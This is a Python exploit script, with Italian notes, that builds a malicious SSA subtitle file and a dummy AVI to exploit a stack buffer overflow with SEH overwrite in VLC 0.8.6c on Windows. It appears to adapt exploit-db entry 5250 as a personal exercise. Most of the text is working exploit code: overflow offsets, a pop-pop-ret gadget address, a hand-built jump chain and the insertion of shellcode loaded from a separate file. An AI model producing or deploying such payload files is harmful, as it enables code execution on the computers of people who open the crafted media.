"""
storia:
ho preso l'exploit da https://www.exploit-db.com/exploits/5250
non funziona
però intanto il programma crasha, inoltre è un exploit verificato
-> exploit che dipende dalla versione di Windows
prendo spunto da 5250.c
ore di reverse engineering (time travel di windbg è fantastico)
(no DEP, no tabella SEH)
(funzione vulnerabile: 649031C0 o libsubtitle_plugin.dll+31C0)
ore di debug
-> stack buffer overflow -> SEH overwrite -> shellcode

NOTA sovrascrivo il SEH record di un DLL di sistema -> dipende dalla versione (ho 21H1)
si potrebbe fare rop; bisognerebbe cercare "jmp esp" in tutti i dll
"""
# instructions: run the script: try to open the generated avi file and the generated subtitles.
# credit to MAI XUAN CUONG, this exploit script is based on his/hers

from pwintools import *

RET_ADDR_OFFS = 0x2809c - 0x70 + 0x10
SEH_RECORD_OFFS = 165296 # from cyclic

# gadgets
POPPOPRET = 0x00401446 # pop edi; pop ebp; ret;

# extra data
SSA_SKELETON = b'''[Script Info]
Title: VLC <= 0.8.6c,e buffer-overflow
ScriptType: v4.00
Collisions: Normal
[V4 Styles]
[Events]
Dialogue:'''

AVI_SIMPLEST = b'\x52\x49\x46\x46\x0C\x00\x00\x00\x41\x56\x49\x20\x4C\x49\x53\x54\x00\x00\x00\x00'

# main

# read shellcode
with open('MSFP', 'rb') as f:
	shellcode = f.read()

lenSc = len(shellcode)
jmpTarget = 0x100000000 - (lenSc + 8) # 32-bit two's complement

# write payload to file
with open('Bof-VLC.ssa', 'wb') as f:
	payload = (
		SSA_SKELETON +
		b'a' * (SEH_RECORD_OFFS - lenSc - 8) +
		shellcode +
		b'\x90\x90\x90\xe9' + # jmp rel32 to shellcode
		p32(jmpTarget) +
		b'\xeb\xf9\x90\x90' + # begin of SEH_Record; jmp rel8 to jmp rel32 (-7)
		p32(POPPOPRET) # custom exception handler
		# POPPOPRET contains a 0, which is invalid; but 0 is fine as last byte (?)
	)
	f.write(payload)
	print('payload written in Bof-VLC.ssa')

# write dummy avi file
with open('Bof-VLC.avi', 'wb') as f:
	f.write(AVI_SIMPLEST)
